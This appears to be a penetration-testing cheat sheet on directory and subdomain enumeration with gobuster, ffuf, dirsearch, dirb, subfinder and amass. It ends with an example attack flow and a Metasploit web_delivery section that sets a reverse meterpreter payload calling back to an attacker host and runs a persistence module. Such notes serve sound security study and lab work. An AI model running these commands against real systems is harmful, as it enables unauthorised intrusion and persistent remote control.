# DIRBUSTER / DIRECTORY & SUBDOMAIN ENUMERATION

## 1. Basic Concept
Directory brute forcing is used to discover hidden paths like:
- /admin
- /login
- /backup
- /dashboard

Before starting:
- Add target IP in `/etc/hosts` if required

## 2. Gobuster (Directory Enumeration)

Basic Usage:
```
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt
```

With Extensions:
```
gobuster dir -u http://IP -w wordlist.txt -x php,html,txt
```

With Status Codes:
```
gobuster dir -u http://IP -w wordlist.txt -s 200,204,301,302,403,500
```

Advanced Example:
```
gobuster dir -u http://IP -w /usr/share/seclists/... -x php,sh,txt,cgi,js,css
```

Flags Reference:
| Flag | Meaning |
|------|--------|
| -u | Target URL |
| -w | Wordlist |
| -x | File extensions |
| -s | Status codes filter |
| -e | Show full URLs |
| -t | Threads |
| -p | Proxy |
| -U/-P | Auth credentials |

## 3. FFUF (Fast Web Fuzzer)

Basic Directory Scan:
```
ffuf -u http://IP/FUZZ -w wordlist.txt
```

Save Output:
```
ffuf -u http://IP/FUZZ -w wordlist.txt -o result.txt
```

Advanced Filtering:
```
ffuf -u http://IP/FUZZ -w wordlist.txt -mc all -fw 31 -fc 404
```

Subdomain Fuzzing:
```
ffuf -u http://FUZZ.domain.com -H "Host: FUZZ.domain.com" -w wordlist.txt
```

POST Request Fuzzing:
```
ffuf -u http://target/settings \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "name=test&password=test&FUZZ=test" \
-w wordlist.txt
```

Important Options:
| Flag | Meaning |
|------|--------|
| FUZZ | Injection point |
| -w | Wordlist |
| -mc | Match HTTP codes |
| -fw | Filter word count |
| -fc | Filter status codes |
| -fs | Filter response size |
| -H | Custom header |
| -X | HTTP method |

## 4. Dirsearch
```
dirsearch -u http://target -e php,txt,conf -x 403,404
```

## 5. DIRB Tool
```
dirb http://IP -R
```

## 6. Subdomain Enumeration

Gobuster DNS:
```
gobuster dns -d domain.com -w wordlist.txt
```

Subfinder:
```
subfinder -d domain.com
```

Alive Subdomains:
```
echo domain.com | subfinder -silent | httpx -silent
```

Sublist3r:
```
sublist3r -d domain.com
```

Amass:
```
amass enum -d domain.com
```

FFUF Subdomain:
```
ffuf -u http://FUZZ.domain.com -H "Host: FUZZ.domain.com" -w wordlist.txt
```

## 7. Example Attack Flow
1. Add domain in `/etc/hosts`
2. Run gobuster / ffuf
3. Find hidden path (example: /retro)
4. Access login page
5. Get credentials
6. Use RDP / SSH access

## 8. Remote Access Tools

RDP:
```
rdesktop -u user -p pass IP
```

```
xfreerdp /u:user /p:pass /v:IP
```

## 9. Metasploit Web Delivery

```
msfconsole
```

```
use exploit/multi/script/web_delivery
```

```
set TARGET 2
set LHOST <your_ip>
set LPORT <port>
set payload windows/meterpreter/reverse_http
```

```
run -j
```

Post Exploitation:
```
sessions 1
```

```
run persistence -X
```

## 10. Tool Summary
- gobuster → directory brute force  
- ffuf → fast fuzzing  
- dirsearch → web path discovery  
- subfinder → subdomains  
- amass → deep recon  
- httpx → live host check  

## 11. Key Idea
Gobuster → directories  
FFUF → fuzzing  
Dirsearch → paths  
Subfinder/Amass → subdomains  
httpx → validation  
